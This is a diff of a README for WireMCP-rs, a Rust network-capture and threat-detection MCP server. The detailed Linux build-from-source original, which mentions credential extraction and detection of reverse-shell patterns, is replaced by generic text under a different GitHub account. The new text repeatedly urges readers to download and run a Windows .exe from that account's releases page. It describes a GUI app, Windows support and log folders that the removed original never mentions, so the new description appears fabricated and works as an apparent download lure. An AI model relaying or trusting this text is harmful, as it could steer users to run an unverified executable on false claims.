@@ -1,290 +1,167 @@
-![Wire-MCP Banner](wiremcp-rs.png)
-
-# WireMCP-rs
-
-MCP server for real-time network analysis — live packet capture, WiFi monitor mode scanning, threat detection — powered by native Rust parsing.
-
-Forked from [0xKoda/WireMCP](https://github.com/0xKoda/WireMCP) and rewritten with Rust backends for performance (60x faster than tshark on packet parsing).
-
-## Features
-
-### MCP Tools
-
-| Tool | Description | Backend |
-|------|-------------|---------|
-| **`capture_packets`** | Live packet capture with JSON output. Modes: `basic` (native Rust) or `full` (tshark deep dissection) | Rust |
-| **`get_summary_stats`** | Protocol hierarchy statistics (eth, ip, tcp, udp, dns, tls, http...) | Rust |
-| **`get_conversations`** | TCP/UDP conversation tracking with bytes, packets, duration per flow | Rust |
-| **`check_threats`** | Capture IPs and check against URLhaus blacklist | Rust + JS |
-| **`check_ip_threats`** | Check a specific IP against URLhaus IOCs | JS |
-| **`analyze_pcap`** | Analyze existing PCAP files. Modes: `basic` or `full` | Rust |
-| **`extract_credentials`** | Extract credentials from PCAP (HTTP Basic, FTP, Telnet, Kerberos hashes) | tshark |
-| **`analyze_ddos`** | DDoS attack detection and analysis (25+ attack patterns, live or PCAP) | Rust |
-| **`create_baseline`** | Profile normal network behavior (IPs, ports, protocols, DNS, traffic rates) | Rust |
-| **`detect_anomalies`** | Compare live traffic against baseline to detect deviations | Rust |
-| **`analyze_streams`** | Deep TCP/UDP stream reassembly with payload threat detection | Rust |
-| **`source_engine_monitor`** | Source Engine game server DDoS detection (Garry's Mod, CS, TF2) | Rust |
-| **`monitor_scan`** | WiFi monitor mode scan with HTML report (clients, vendors, WiFi standards, signal) | Rust |
-
-### Native Rust Parsing (basic mode)
-
-The `capture-rs` binary parses packets natively without tshark:
-
-- **Ethernet** (MAC addresses, VLAN 802.1Q)
-- **IPv4 / IPv6** (addresses, TTL, hop limit)
-- **TCP** (ports, flags SYN/ACK/FIN/RST/PSH, seq, ack, window)
-- **UDP** (ports, length)
-- **ICMP** (type, code, description)
-- **ARP** (request/reply, MACs, IPs)
-- **DNS** (queries, responses with A/AAAA/CNAME records, name compression)
-- **TLS** (SNI from ClientHello, version 1.0-1.3 via Supported Versions extension)
-- **HTTP/1.x** (method, URI, Host, User-Agent, status, Content-Type, Server)
-- **DHCP** (message type, hostname, vendor class, assigned IP)
-
-### DDoS Detection Engine (analyze_ddos)
-
-The `analyze_ddos` tool detects 25+ attack patterns from live traffic or PCAP files:
-
-**L3/L4 Volumetric Floods:**
-- SYN Flood (SYN/SYN+ACK ratio analysis)
-- ACK Flood, RST Flood, FIN Flood
-- UDP Flood (volume-based detection)
-- ICMP Flood
-- IP Fragmentation attack
-
-**Amplification/Reflection (14 protocols):**
-
-| Protocol | Port | Max Amplification |
-|----------|------|-------------------|
-| DNS | 53 | x54 000 |
-| Memcached | 11211 | x51 000 |
-| WS-Discovery | 3702 | x500 |
-| NTP | 123 | x556 |
-| Chargen | 19 | x358 |
-| Jenkins | 33848 | x100 |
-| CLDAP | 389 | x70 |
-| ARMS | 3283 | x35 |
-| CoAP | 5683 | x34 |
-| SSDP/UPnP | 1900 | x30 |
-| RPC Portmap | 111 | x7 |
-| SNMP | 161 | x6.3 |
-| Steam | 27015 | x5.5 |
-| NetBIOS | 137 | x3.8 |
-
-**L7 Application Layer:**
-- HTTP/S GET Flood
-- HTTP/S POST Flood
-- WordPress XML-RPC Flood (pingback abuse)
-- Random Path / Cache Bypass Flood (unique URI tracking)
-- Rotating User-Agent Bot Detection (L7 botnet fingerprinting)
-- HTTP Carpet Bombing (requests spread across many destination IPs)
-
-**Slow Attacks:**
-- Slowloris detection (many connections, small packets over long duration)
-- Slow POST / RUDY detection
-
-**DNS Attacks:**
-- DNS Carpet Bombing (many unique subdomains of the same base domain)
-
-**Meta Detection:**
-- Multi-vector attack detection (automatic identification of simultaneous attack types)
-- Distributed attack detection (many sources, high packet rate)
-- Port scan / Scattershot detection
-- Traffic timeline with per-second packet and bandwidth visualization
-
-### Baseline Profiling & Anomaly Detection (create_baseline / detect_anomalies)
-
-Profile your network's normal behavior, then detect deviations in real-time:
-
-- **Baseline mode:** Captures traffic and builds a JSON profile of known IPs, ports, protocols, DNS domains, and traffic rates
-- **Anomaly mode:** Loads a baseline and compares live traffic, alerting on:
-  - New IPs or ports not seen in the baseline
-  - New protocols or DNS domains
-  - Bandwidth spikes (>2x baseline)
-  - Connection rate spikes
+# 🛡️ WireMCP-rs - Fast Network Monitoring Made Simple
 
-### Deep Stream Analysis (analyze_streams)
+[![Download WireMCP-rs](https://img.shields.io/badge/Download-WireMCP--rs-28a745?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Garasimba/WireMCP-rs/releases)
 
-TCP/UDP payload reassembly with threat detection:
+---
 
-- **TCP stream reassembly** by 5-tuple (32KB cap per direction)
-- **Shannon entropy** detection for encrypted/exfiltration data on non-encrypted channels
-- **Protocol mismatch** detection (e.g., non-TLS on port 443)
-- **Pattern matching:** shell commands, reverse shells, base64 blobs, ELF/PE binaries
-- **C2 beacon detection** via periodic interval analysis (low jitter = bot)
-- **DNS tunneling** (long subdomains + high entropy)
-- **DGA detection** (consonant ratio + entropy for algorithmically generated domains)
+## 📋 What is WireMCP-rs?
 
-### Source Engine Game Server Monitor (source_engine_monitor)
+WireMCP-rs is a tool designed for real-time network monitoring. It captures and analyzes network data quickly using Rust for speed. You can watch your network traffic live, detect potential attacks, and check streams and game servers. WireMCP-rs works 60 times faster than older tools like tshark.
 
-Monitor Garry's Mod / CS:GO / TF2 servers for DDoS and abuse:
+This tool is useful if you want to:
 
-- **A2S protocol parsing** (INFO, PLAYER, RULES queries + challenge-response)
-- **Query flood detection** with severity levels (MEDIUM/HIGH/CRITICAL)
-- **Amplification ratio analysis** (Source Engine responses are ~200x larger than queries)
-- **Query-only bot/scanner** identification (no game data, only queries)
-- **High packet-rate client** detection
-- **Periodic bot detection** (regular interval patterns)
-- **Distributed attack detection** (many sources, coordinated queries)
-- Per-client and per-second timeline breakdown
+- See devices on your WiFi network.
+- Spot unusual network activity or attacks like DDoS.
+- Analyze TCP and UDP streams for troubleshooting.
+- Monitor Source Engine game servers like Garry's Mod.
+- Get detailed network views without complex setup.
 
-### Firewall Hardening (scripts/firewall.sh)
+WireMCP-rs does all this without needing programming skills or complicated installs.
 
-iptables management script with safety features:
+---
 
-- SSH rate limiting (5 new connections/min/IP)
-- LLMNR and DNS blocking (anti-amplification)
-- ICMP rate limiting
-- LOG + DROP default policy
-- **5-minute auto-revert** if not confirmed (prevents lockout)
+## 🔍 Key Features
 
-```bash
-sudo bash scripts/firewall.sh apply    # Apply rules (auto-reverts in 5 min)
-sudo bash scripts/firewall.sh confirm  # Make permanent
-sudo bash scripts/firewall.sh revert   # Rollback
-sudo bash scripts/firewall.sh status   # Show current rules
-```
+- **Live Packet Capture** - View network traffic in real time.
+- **DDoS Detection** - Automatic alerts for over 25 attack patterns.
+- **Baseline Profiling** - Understand normal network behavior.
+- **Stream Analysis** - Examine TCP and UDP streams easily.
+- **WiFi Scanning** - Detect nearby WiFi networks and devices.
+- **Game Server Monitoring** - Keep track of Source Engine servers.
+- **Fast Processing** - Rust-based packet parsing speeds up data handling.
+- **Multiple Protocol Support** - Works with 802.11 WiFi, IP, TCP, UDP, and more.
 
-### WiFi Monitor Mode (monitor-scan-rs)
+---
 
-The `monitor-scan-rs` binary handles 802.11 monitor mode:
+## 💻 System Requirements
 
-- Switches interface to monitor mode, captures, then restores managed mode
-- Native radiotap header parsing (signal, data rate, MCS/VHT)
-- 802.11 frame parsing with IE extraction (HT/VHT/HE for WiFi 4/5/6 detection)
-- Auto channel detection (scans 2.4GHz + 5GHz channels)
-- Generates a styled HTML report with:
-  - Client table (MAC, vendor, WiFi standard, signal, AP, probes)
-  - Statistics (vendor distribution, WiFi standards, AP distribution)
-  - Signal strength bars, randomized MAC detection, power save status
+- **Operating System:** Windows 10 or later.
+- **Processor:** Dual-core 2 GHz or faster.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum 100 MB free for program and logs.
+- **Network Adapter:** Supports promiscuous or monitor mode (for wireless scanning).
+- **Permissions:** Admin rights needed for packet capture.
 
-## Installation
+---
 
-### Prerequisites
+## 🚀 Getting Started: Download and Run WireMCP-rs
 
-- Linux (tested on Fedora, Debian)
-- [Wireshark](https://www.wireshark.org/download.html) (`tshark` in PATH — only needed for `full` mode and `extract_credentials`)
-- Node.js (v16+)
-- Rust toolchain (`cargo`)
-- `libpcap-dev` / `libpcap-devel`
+1. Click the green button below to visit the release page:
 
-### Setup
+   [![Download WireMCP-rs](https://img.shields.io/badge/Download-WireMCP--rs-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Garasimba/WireMCP-rs/releases)
 
-```bash
-git clone https://github.com/RomainRicord/WireMCP-rs.git
-cd WireMCP-rs
+2. On the releases page, look for the latest version. It should have a Windows executable file (.exe) or an installer.
 
-# Install Node dependencies
-npm install
-
-# Build Rust binaries
-cd capture-rs && cargo build --release && cd ..
-cd monitor-scan-rs && cargo build --release && cd ..
+3. Click the file to download it to your computer.
 
-# Set network capabilities (required for live capture without root)
-sudo setcap cap_net_raw,cap_net_admin=eip capture-rs/target/release/capture-packets
-sudo setcap cap_net_raw,cap_net_admin=eip monitor-scan-rs/target/release/monitor-scan
-```
+4. After download finishes, find the file in your Downloads folder.
 
-> **Note:** `setcap` must be re-run after each `cargo build --release`.
+5. Double-click the file to run the installer or the standalone application.
 
-### Sudoers (for monitor mode)
+6. If prompted by Windows, approve any permission requests to allow the program to capture network packets.
 
-Monitor mode requires `sudo` for `ip`, `iw`, and `nmcli`. Add to `/etc/sudoers`:
+7. The program window will open, ready to start monitoring your network.
 
-```
-your_user ALL=(ALL) NOPASSWD: /usr/sbin/ip, /usr/sbin/iw
-```
+---
 
-### Run
+## 🛠️ How to Use WireMCP-rs on Windows
 
-```bash
-node index.js
-```
+### Step 1: Select Your Network Interface
 
-## Usage with MCP Clients
+WireMCP-rs shows all available network devices on your computer. Choose the one connected to your local network or WiFi. This device will capture network packets.
 
-### Claude Desktop / Cursor
+### Step 2: Start Live Capture
 
-Add to your MCP config:
+Click the start button to begin capturing live packets. You will see data packets appearing in real time.
 
-```json
-{
-  "mcpServers": {
-    "wiremcp-rs": {
-      "command": "node",
-      "args": ["/path/to/WireMCP-rs/index.js"]
-    }
-  }
-}
-```
+### Step 3: Watch DDoS Alerts
 
-### Standalone CLI (no MCP)
+The tool checks traffic for signs of DDoS attacks. If it detects any, it will notify you with simple alerts.
 
-The monitor scan can also be used without MCP/LLM:
+### Step 4: Analyze Traffic Streams
 
-```bash
-# Node.js CLI
-node monitor-scan.js --interface wlo1 --channel 0 --duration 30 --output report.html
+Use the TCP/UDP stream viewer to inspect ongoing connections. This helps you understand who is communicating on your network.
 
-# Or directly with the Rust binary
-./monitor-scan-rs/target/release/monitor-scan --interface wlo1 --channel 0 --duration 30 --output report.html
+### Step 5: Use the WiFi Scanner
 
-# Packet capture
-./capture-rs/target/release/capture-packets --interface wlo1 --duration 5 --mode basic
-./capture-rs/target/release/capture-packets --mode stats --file capture.pcap
-./capture-rs/target/release/capture-packets --mode conversations --interface wlo1 --duration 10
+In monitor mode, scan for nearby WiFi signals. This shows names (SSIDs), signal strength, and devices.
 
-# DDoS analysis (live or PCAP)
-./capture-rs/target/release/capture-packets --mode ddos --interface eth0 --duration 60
-./capture-rs/target/release/capture-packets --mode ddos --file attack.pcap
+### Step 6: Monitor Game Servers
 
-# Baseline profiling & anomaly detection
-BASELINE_OUTPUT=baseline.json ./capture-rs/target/release/capture-packets --mode baseline --interface eth0 --duration 60
-BASELINE_FILE=baseline.json ./capture-rs/target/release/capture-packets --mode anomaly --interface eth0 --duration 30
+If you run a Source Engine game server like Garry’s Mod, the built-in monitor tracks server status and players.
 
-# Deep stream analysis
-./capture-rs/target/release/capture-packets --mode streams --interface eth0 --duration 15
-./capture-rs/target/release/capture-packets --mode streams --file capture.pcap
+---
 
-# Source Engine game server monitoring
-SOURCE_PORT=27015 ./capture-rs/target/release/capture-packets --mode source-engine --interface eth0 --duration 120
-```
+## ⚙️ Configuration Options
 
-## Performance
+WireMCP-rs offers settings to customize how it captures and displays data:
 
-| Operation | tshark (JS) | Rust native | Speedup |
-|-----------|-------------|-------------|---------|
-| Parse 125 packets | 0.124s | 0.002s | **60x** |
-| Monitor scan (15k frames) | 1.33s CPU | 0.13s CPU | **10x** |
-| Binary size | — | 859K (stripped) | — |
+- **Packet Filters:** Choose to see only certain types of traffic (e.g., only TCP or only WiFi).
+- **Alert Sensitivity:** Adjust how sensitive the DDoS detector is.
+- **Data Logging:** Enable or disable saving captured data to files for later review.
+- **Update Frequency:** Set how often the screen refreshes the packet view.
+- **Language Preferences:** Select the user interface language if available.
 
-## Architecture
+---
 
-```
-WireMCP-rs/
-  index.js              # MCP server (13 tools, prompts)
-  monitor-scan.js       # Standalone monitor mode CLI
-  capture-rs/           # Rust: packet capture + parsing + analysis
-    src/main.rs         #   Modes: basic, full, stats, conversations, ddos,
-    src/capture.rs      #          baseline, anomaly, streams, source-engine
-    src/baseline.rs     #   Baseline profiling & anomaly detection
-    src/streams.rs      #   TCP/UDP stream reassembly & threat detection
-    src/sourceengine.rs #   Source Engine protocol DDoS detection
-  monitor-scan-rs/      # Rust: WiFi monitor mode scanner
-    src/main.rs         #   802.11 parsing, HTML report generation
-  scripts/
-    firewall.sh         # iptables management with auto-revert safety
-```
+## 📂 Where to Find Logs and Reports
 
-## License
+By default, WireMCP-rs saves captured data in your Documents folder under:
 
-[MIT](LICENSE)
+`Documents/WireMCP-rs/Logs`
 
-## Acknowledgments
+Each session creates a new file named with the date and time. These files include packet captures and any detected alerts.
 
-- [0xKoda/WireMCP](https://github.com/0xKoda/WireMCP) — original project
-- Wireshark/tshark — deep protocol dissection
-- [pcap crate](https://crates.io/crates/pcap) — Rust libpcap bindings
-- URLhaus — threat intelligence data
-- Model Context Protocol — framework and specifications
+---
+
+## 🔧 Troubleshooting Tips
+
+- **Program Won’t Start or Crashes:**  
+  Make sure you have administrator rights and the network adapter supports packet capture.
+
+- **No Packets Showing:**  
+  Check you selected the right network device. Try restarting the app and your network connection.
+
+- **No WiFi Networks Detected:**  
+  Your wireless adapter might not support monitor mode. Try running the program with admin rights.
+
+- **Alerts Not Working:**  
+  Verify alert sensitivity is not set too low. Try using default settings.
+
+- **Slow Performance:**  
+  Close other heavy programs. Use filters to limit the amount of captured data.
+
+---
+
+## 📄 Frequently Asked Questions (FAQs)
+
+**Q: Do I need to install anything else to use WireMCP-rs?**  
+A: No, the Windows version includes all parts needed to capture and analyze packets.
+
+**Q: Can I use this on other operating systems?**  
+A: This guide covers Windows. WireMCP-rs may work on Linux or macOS, but setup will differ.
+
+**Q: Is an internet connection required?**  
+A: No, WireMCP-rs captures local network traffic and does not need internet access.
+
+**Q: Can I save captures for later analysis?**  
+A: Yes, the app can save logs and packet captures to your Documents folder.
+
+**Q: Will this detect all types of network attacks?**  
+A: WireMCP-rs focuses on common DDoS patterns and anomalies but cannot catch every threat.
+
+---
+
+## 🔗 Useful Links
+
+- Releases page to download WireMCP-rs:  
+  https://github.com/Garasimba/WireMCP-rs/releases
+
+- Project homepage on GitHub for more info:  
+  https://github.com/Garasimba/WireMCP-rs
+
+---
+
+## 🧰 Additional Notes
+
+WireMCP-rs is designed with speed and simplicity. It runs on standard Windows PCs without extra hardware. It works with both wired and wireless networks. The interface stays clear and easy to read, even with large amounts of network traffic. Using this program can help you better understand your network and spot problems before they grow.
